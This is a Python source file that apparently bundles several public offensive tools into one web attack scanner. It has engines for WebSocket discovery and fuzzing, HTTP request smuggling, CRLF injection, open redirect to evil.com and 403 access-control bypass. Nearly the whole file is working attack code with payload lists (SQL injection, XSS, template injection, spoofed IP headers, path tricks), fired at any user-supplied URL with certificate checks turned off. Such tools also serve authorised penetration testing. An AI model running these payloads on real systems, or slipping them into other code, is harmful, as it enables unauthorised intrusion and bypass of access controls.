#!/usr/bin/env python3
"""
ZYLON FUSION v4.0 NUCLEAR - Advanced Attack Engines Batch 2
============================================================
Fused from: STEWS (WebSocket), http-request-smuggling, CRLFuzz,
           OpenRedireX, 403-Bypass
Purpose: WebSocket security, HTTP smuggling, CRLF, Open Redirect, 403 bypass
Python 3.13 Compatible | Termux Non-Root
"""

import os
import re
import sys
import time
import socket
import ssl
import json
import requests
import urllib3
from urllib.parse import urlparse, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# WEBSOCKET SECURITY ENGINE (STEWS Fusion)
# ============================================================================

class WebSocketSecurityEngine:
    """WebSocket Security Testing Engine"""
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        self.results = []
    
    def discover_websocket(self, url=None):
        """Discover WebSocket endpoints"""
        target = url or self.target_url
        findings = []
        
        # Common WebSocket paths
        ws_paths = [
            '/ws', '/websocket', '/socket', '/chat', '/stream',
            '/live', '/realtime', '/push', '/notify', '/events',
            '/socket.io/?EIO=4&transport=websocket',
            '/graphql', '/graphql/subscriptions',
            '/api/ws', '/api/websocket', '/api/socket',
            '/cable', '/action_cable',
            '/signalr', '/signalr/connect',
            '/ws/v1', '/ws/v2',
        ]
        
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in ws_paths:
            try:
                ws_url = f"wss://{parsed.netloc}{path}"
                http_url = f"{base}{path}"
                
                resp = requests.get(http_url, timeout=5, verify=False, 
                                   headers={'Connection': 'Upgrade', 'Upgrade': 'websocket'})
                
                if resp.status_code in [101, 426, 400, 501]:
                    if 'upgrade' in resp.headers.get('connection', '').lower():
                        findings.append({
                            'path': path,
                            'url': ws_url,
                            'status': resp.status_code,
                            'type': 'WebSocket endpoint confirmed'
                        })
            except Exception:
                continue
        
        return findings
    
    def test_unauth_access(self, ws_url):
        """Test for unauthenticated WebSocket access"""
        return {
            'url': ws_url,
            'test': 'unauthenticated_access',
            'description': 'Try connecting without authentication tokens',
            'payload': 'Connect without any auth headers/cookies',
        }
    
    def test_message_fuzzing(self, ws_url):
        """Generate fuzz payloads for WebSocket messages"""
        fuzz_payloads = [
            {'type': 'json', 'payload': json.dumps({'action': 'subscribe', 'channel': '*'})},
            {'type': 'json', 'payload': json.dumps({'action': 'admin', 'cmd': 'list'})},
            {'type': 'json', 'payload': json.dumps({'type': 'ping'})},
            {'type': 'json', 'payload': json.dumps({'action': 'execute', 'cmd': 'id'})},
            {'type': 'string', 'payload': "' OR 1=1--"},
            {'type': 'string', 'payload': '<script>alert(1)</script>'},
            {'type': 'string', 'payload': '{{7*7}}'},
            {'type': 'string', 'payload': '${7*7}'},
            {'type': 'long', 'payload': 'A' * 10000},
            {'type': 'null', 'payload': '\x00'},
            {'type': 'format_string', 'payload': '%s%s%s%s%s'},
        ]
        return fuzz_payloads
    
    def full_scan(self, url=None):
        """Full WebSocket security scan"""
        endpoints = self.discover_websocket(url)
        
        all_results = {
            'endpoints': endpoints,
            'tests': [],
        }
        
        for ep in endpoints:
            ws_url = ep.get('url', '')
            
            # Unauthenticated access test
            all_results['tests'].append(self.test_unauth_access(ws_url))
            
            # Message fuzzing payloads
            fuzz = self.test_message_fuzzing(ws_url)
            all_results['tests'].append({
                'url': ws_url,
                'test': 'message_fuzzing',
                'payloads': fuzz
            })
        
        return all_results


# ============================================================================
# HTTP REQUEST SMUGGLING ENGINE
# ============================================================================

class HTTPSmugglingEngine:
    """HTTP Request Smuggling Detection Engine"""
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def detect_cl_te(self, url=None):
        """Detect CL.TE smuggling"""
        target = url or self.target_url
        results = []
        
        # CL.TE payload - front-end uses Content-Length, back-end uses Transfer-Encoding
        payloads = [
            {
                'name': 'CL.TE basic',
                'method': 'POST',
                'path': '/',
                'headers': {
                    'Content-Length': '13',
                    'Transfer-Encoding': 'chunked',
                },
                'body': '0\r\n\r\nSMUGGLED',
            },
            {
                'name': 'CL.TE timing',
                'method': 'POST',
                'path': '/',
                'headers': {
                    'Content-Length': '35',
                    'Transfer-Encoding': 'chunked',
                },
                'body': '0\r\n\r\nGET /404 HTTP/1.1\r\nFoo: x',
            },
        ]
        
        for payload in payloads:
            try:
                start = time.time()
                resp = requests.post(
                    target,
                    headers=payload['headers'],
                    data=payload['body'],
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False
                )
                elapsed = time.time() - start
                
                # If timing is significantly different, might be vulnerable
                findings = {
                    'type': 'CL.TE',
                    'payload': payload['name'],
                    'status': resp.status_code,
                    'elapsed': elapsed,
                    'headers': dict(resp.headers),
                    'vulnerable': elapsed > 2 or resp.status_code in [400, 502]
                }
                results.append(findings)
            except Exception as e:
                results.append({'type': 'CL.TE', 'payload': payload['name'], 'error': str(e)})
        
        return results
    
    def detect_te_cl(self, url=None):
        """Detect TE.CL smuggling"""
        target = url or self.target_url
        results = []
        
        payloads = [
            {
                'name': 'TE.CL basic',
                'method': 'POST',
                'path': '/',
                'headers': {
                    'Content-Length': '3',
                    'Transfer-Encoding': 'chunked',
                },
                'body': '8\r\nSMUGGLED\r\n0\r\n\r\n',
            },
        ]
        
        for payload in payloads:
            try:
                resp = requests.post(
                    target,
                    headers=payload['headers'],
                    data=payload['body'],
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False
                )
                findings = {
                    'type': 'TE.CL',
                    'payload': payload['name'],
                    'status': resp.status_code,
                    'headers': dict(resp.headers),
                    'vulnerable': resp.status_code in [400, 502]
                }
                results.append(findings)
            except Exception as e:
                results.append({'type': 'TE.CL', 'payload': payload['name'], 'error': str(e)})
        
        return results
    
    def detect_te_te(self, url=None):
        """Detect TE.TE (obfuscated TE) smuggling"""
        target = url or self.target_url
        results = []
        
        obfuscations = [
            'Transfer-Encoding: xchunked',
            'Transfer-Encoding : chunked',
            'Transfer-Encoding: chunked\r\nTransfer-Encoding: x',
            'Transfer-Encoding: chunked\r\nTransfer-encoding: x',
            'Transfer-Encoding: \tchunked',
            'Transfer-Encoding: chunked\x00',
            'Transfer-Encoding: chunked\r\nX: x',
        ]
        
        for te_header in obfuscations:
            try:
                # This requires raw socket - simplified version
                results.append({
                    'type': 'TE.TE obfuscation',
                    'payload': te_header[:50],
                    'note': 'Requires raw socket for accurate testing'
                })
            except Exception:
                pass
        
        return results
    
    def full_scan(self, url=None):
        """Full HTTP smuggling scan"""
        return {
            'cl_te': self.detect_cl_te(url),
            'te_cl': self.detect_te_cl(url),
            'te_te': self.detect_te_te(url),
        }


# ============================================================================
# CRLF INJECTION ENGINE (CRLFuzz Fusion)
# ============================================================================

class CRLFEngine:
    """CRLF Injection Detection Engine"""
    
    CRLF_PAYLOADS = [
        '%0d%0aSet-Cookie:crlfinjection=test',
        '%0d%0aLocation:%20http://evil.com',
        '%0d%0aX-Injected:%20true',
        '%0D%0ASet-Cookie:crlfinjection=test',
        '\r\nSet-Cookie:crlfinjection=test',
        '%0d%0a%0d%0a<script>alert(1)</script>',
        '%0dSet-Cookie:crlfinjection=test',
        '%0aSet-Cookie:crlfinjection=test',
        '%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK',
        '%0d%0aX-Forwarded-For:%20127.0.0.1',
    ]
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def scan(self, url=None):
        """Scan for CRLF injection in URL parameters"""
        target = url or self.target_url
        findings = []
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        # Test in URL path
        for payload in self.CRLF_PAYLOADS:
            test_url = f"{base}/{payload}"
            try:
                resp = requests.get(test_url, timeout=self.timeout, verify=False,
                                   allow_redirects=False)
                
                # Check for injection in response headers
                for header_name, header_value in resp.headers.items():
                    if 'crlfinjection' in header_value.lower() or 'x-injected' in header_name.lower():
                        findings.append({
                            'type': 'CRLF Injection',
                            'location': 'URL path',
                            'payload': payload,
                            'evidence': f'{header_name}: {header_value}',
                            'severity': 'HIGH'
                        })
                
                # Check for split response
                if resp.text and '<script>alert(1)</script>' in resp.text:
                    findings.append({
                        'type': 'CRLF Header Injection',
                        'location': 'URL path',
                        'payload': payload,
                        'evidence': 'XSS payload reflected in body via CRLF',
                        'severity': 'CRITICAL'
                    })
            except Exception:
                continue
        
        # Test in query parameters
        qs_params = parsed.query
        if qs_params:
            for param in qs_params.split('&'):
                if '=' in param:
                    param_name = param.split('=')[0]
                    for payload in self.CRLF_PAYLOADS:
                        test_url = f"{base}{parsed.path}?{param_name}={payload}"
                        try:
                            resp = requests.get(test_url, timeout=self.timeout, verify=False,
                                               allow_redirects=False)
                            
                            for header_name, header_value in resp.headers.items():
                                if 'crlfinjection' in header_value.lower():
                                    findings.append({
                                        'type': 'CRLF Injection',
                                        'location': f'parameter: {param_name}',
                                        'payload': payload,
                                        'evidence': f'{header_name}: {header_value}',
                                        'severity': 'HIGH'
                                    })
                        except Exception:
                            continue
        
        return findings


# ============================================================================
# OPEN REDIRECT ENGINE (OpenRedireX Fusion)
# ============================================================================

class OpenRedirectEngine:
    """Open Redirect Detection Engine"""
    
    REDIRECT_PAYLOADS = [
        'https://evil.com',
        '//evil.com',
        '//evil.com/',
        'https://evil.com%00.target.com',
        'https://evil.com\\.target.com',
        '///evil.com',
        'https:///evil.com',
        'javascript:alert(1)',
        '//evil.com?target.com',
        'https:evil.com',
        '/%09/evil.com',
        'https://evil.com%0d%0a.target.com',
        '//evil.com%23.target.com',
        '//evil.com%2523.target.com',
        'https://evil.com%40target.com',
        '/\\evil.com',
        '//evil.com/.target.com',
    ]
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def scan(self, url=None, param_name='url'):
        """Scan for open redirect vulnerabilities"""
        target = url or self.target_url
        findings = []
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        # Common redirect parameter names
        redirect_params = ['url', 'redirect', 'next', 'return', 'returnTo',
                          'return_to', 'continue', 'dest', 'destination',
                          'go', 'goto', 'redir', 'redirect_uri', 'redirect_url',
                          'target', 'link', 'callback', 'ref', 'redirectTo']
        
        # If URL has query params, test those
        test_params = redirect_params[:10]
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    test_params.insert(0, param.split('=')[0])
        
        for param in test_params:
            for payload in self.REDIRECT_PAYLOADS:
                test_url = f"{base}{parsed.path}?{param}={payload}"
                try:
                    resp = requests.get(test_url, timeout=self.timeout, verify=False,
                                       allow_redirects=False)
                    
                    # Check for redirect
                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location:
                            findings.append({
                                'parameter': param,
                                'payload': payload,
                                'redirect_to': location,
                                'status': resp.status_code,
                                'severity': 'MEDIUM'
                            })
                except Exception:
                    continue
        
        return findings


# ============================================================================
# 403 BYPASS ENGINE
# ============================================================================

class Bypass403Engine:
    """403 Forbidden Bypass Engine"""
    
    BYPASS_TECHNIQUES = {
        'HTTP Methods': [
            ('OPTIONS', None), ('PUT', None), ('DELETE', None), ('PATCH', None),
            ('TRACE', None), ('HEAD', None), ('PROPFIND', None), ('PROPPATCH', None),
        ],
        'Header Manipulation': [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Host': 'localhost'},
            {'X-Forwarded-Server': 'localhost'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'Origin': 'https://localhost'},
            {'Referer': 'https://localhost'},
        ],
        'Path Manipulation': [
            '/admin/', '/admin..;/', '/admin/..;/',
            '/./admin', '//admin', '/admin%20',
            '/admin%09', '/admin%0a', '/admin%0d',
            '/admin%23', '/admin%3f', '/admin%26',
            '/admin/.', '/admin//', '/Admin/',
            '/ADMIN/', '/admin;/', '/admin;/../',
            '/..;/admin', '/admin%2e', '/admin%2f',
        ],
        'URL Encoding': [
            '/%61dmin',  # /admin
            '/%41dmin',  # /Admin
            '/ad%6din',  # /admin
            '/%252e%252e/admin',  # double-encoded ../admin
        ],
    }
    
    def __init__(self, target_url=None, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
    
    def scan(self, url=None):
        """Scan for 403 bypass techniques"""
        target = url or self.target_url
        findings = []
        
        # First verify the URL returns 403
        try:
            base_resp = requests.get(target, timeout=self.timeout, verify=False)
            if base_resp.status_code != 403:
                findings.append({
                    'note': f'URL returns {base_resp.status_code}, not 403. Testing anyway.',
                    'original_status': base_resp.status_code
                })
        except Exception as e:
            return [{'error': str(e)}]
        
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        
        # Test HTTP Methods
        for method, _ in self.BYPASS_TECHNIQUES['HTTP Methods']:
            try:
                resp = requests.request(method, target, timeout=self.timeout, verify=False)
                if resp.status_code not in [403, 405, 501]:
                    findings.append({
                        'technique': 'HTTP Method',
                        'method': method,
                        'status': resp.status_code,
                        'length': len(resp.text),
                        'severity': 'HIGH' if resp.status_code == 200 else 'MEDIUM'
                    })
            except Exception:
                continue
        
        # Test Header Manipulation
        for header_dict in self.BYPASS_TECHNIQUES['Header Manipulation']:
            try:
                resp = requests.get(target, headers=header_dict, timeout=self.timeout, verify=False)
                if resp.status_code != 403 and resp.status_code != base_resp.status_code:
                    findings.append({
                        'technique': 'Header Manipulation',
                        'header': str(header_dict),
                        'status': resp.status_code,
                        'length': len(resp.text),
                        'severity': 'HIGH' if resp.status_code == 200 else 'MEDIUM'
                    })
            except Exception:
                continue
        
        # Test Path Manipulation
        for path_mod in self.BYPASS_TECHNIQUES['Path Manipulation']:
            test_url = f"{base}{path_mod}"
            try:
                resp = requests.get(test_url, timeout=self.timeout, verify=False)
                if resp.status_code not in [403, 404]:
                    findings.append({
                        'technique': 'Path Manipulation',
                        'path': path_mod,
                        'status': resp.status_code,
                        'length': len(resp.text),
                        'severity': 'HIGH' if resp.status_code == 200 else 'MEDIUM'
                    })
            except Exception:
                continue
        
        return findings


# ============================================================================
# CONSOLE INTERFACES
# ============================================================================

def run_waf_scan_wrapper(console=None):
    from core.waf_evasion_engine import run_waf_scan
    run_waf_scan(console)

def run_websocket_scan(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]WEBSOCKET SECURITY ENGINE[/bold cyan]\n"
        "[yellow]Fused from: STEWS | OWASP Research[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    engine = WebSocketSecurityEngine(target_url=url.strip())
    
    with console.status("[bold green]Discovering WebSocket endpoints...", spinner="dots"):
        results = engine.full_scan()
    
    if results['endpoints']:
        console.print(f"[green][+] Found {len(results['endpoints'])} WebSocket endpoint(s)![/green]")
        for ep in results['endpoints']:
            console.print(f"  [cyan]{ep['url']}[/cyan] ({ep['status']})")
    else:
        console.print("[yellow][-] No WebSocket endpoints found.[/yellow]")

def run_smuggling_scan(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]HTTP REQUEST SMUGGLING ENGINE[/bold cyan]\n"
        "[yellow]CL.TE + TE.CL + TE.TE Detection[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    engine = HTTPSmugglingEngine(target_url=url.strip())
    
    with console.status("[bold green]Testing HTTP smuggling vectors...", spinner="dots"):
        results = engine.full_scan()
    
    for attack_type, findings in results.items():
        if findings:
            console.print(f"\n[cyan][{attack_type.upper()}][/cyan]")
            for f in findings:
                if 'error' not in f:
                    vuln = f.get('vulnerable', False)
                    console.print(f"  [{'red' if vuln else 'green'}] {f.get('payload', 'N/A')}: {f.get('status', 'N/A')} {'VULNERABLE!' if vuln else 'Not vulnerable'}")

def run_crlf_scan(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]CRLF INJECTION ENGINE[/bold cyan]\n"
        "[yellow]Fused from: CRLFuzz[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    engine = CRLFEngine(target_url=url.strip())
    
    with console.status("[bold green]Testing CRLF injection...", spinner="dots"):
        findings = engine.scan()
    
    if findings:
        console.print(f"[red][!] {len(findings)} CRLF injection(s) found![/red]")
        for f in findings:
            console.print(f"  [{f['severity']}] {f['location']}: {f['payload'][:60]}")
    else:
        console.print("[green][-] No CRLF injection found.[/green]")

def run_openredirect_scan(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]OPEN REDIRECT ENGINE[/bold cyan]\n"
        "[yellow]Fused from: OpenRedireX[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL[/cyan]")
    engine = OpenRedirectEngine(target_url=url.strip())
    
    with console.status("[bold green]Testing open redirect payloads...", spinner="dots"):
        findings = engine.scan()
    
    if findings:
        console.print(f"[red][!] {len(findings)} open redirect(s) found![/red]")
        for f in findings:
            console.print(f"  [{f['severity']}] param={f['parameter']}: redirects to {f['redirect_to']}")
    else:
        console.print("[green][-] No open redirect found.[/green]")

def run_403bypass_scan(console=None):
    if console is None:
        from rich.console import Console
        console = Console()
    from rich.prompt import Prompt
    from rich.panel import Panel
    
    console.print(Panel(
        "[bold cyan]403 BYPASS ENGINE[/bold cyan]\n"
        "[yellow]HTTP Methods + Headers + Path Manipulation + URL Encoding[/yellow]",
        border_style="bright_cyan"
    ))
    
    url = Prompt.ask("[cyan]Target URL (403 page)[/cyan]")
    engine = Bypass403Engine(target_url=url.strip())
    
    with console.status("[bold green]Testing 403 bypass techniques...", spinner="dots"):
        findings = engine.scan()
    
    if findings:
        bypass_found = [f for f in findings if 'severity' in f and f['severity'] in ('HIGH', 'MEDIUM')]
        if bypass_found:
            console.print(f"[bold red][!] {len(bypass_found)} bypass(es) found![/bold red]")
            for f in bypass_found:
                color = 'red' if f['severity'] == 'HIGH' else 'yellow'
                console.print(f"  [{color}][{f['severity']}] {f['technique']}: {f.get('method', f.get('header', f.get('path', '')))} -> Status {f['status']}[/{color}]")
        else:
            console.print("[yellow][-] No bypass found.[/yellow]")
    else:
        console.print("[yellow][-] No bypass found.[/yellow]")


if __name__ == "__main__":
    run_403bypass_scan()
